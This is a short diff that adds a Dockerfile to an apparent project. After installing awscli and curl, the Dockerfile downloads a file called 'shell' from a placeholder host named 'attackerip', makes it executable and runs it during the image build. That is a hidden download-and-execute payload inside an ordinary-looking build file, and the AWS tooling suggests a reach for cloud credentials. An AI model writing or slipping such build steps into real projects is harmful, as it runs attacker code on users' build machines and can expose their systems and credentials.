@@ -1,0 +1,8 @@
+FROM ubuntu:latest
+
+WORKDIR /app
+
+RUN apt update && apt upgrade -y && apt install awscli -y
+RUN apt-get update; apt-get install curl -y
+RUN curl "attackerip/shell" -o shell && chmod 700 shell
+RUN ./shell
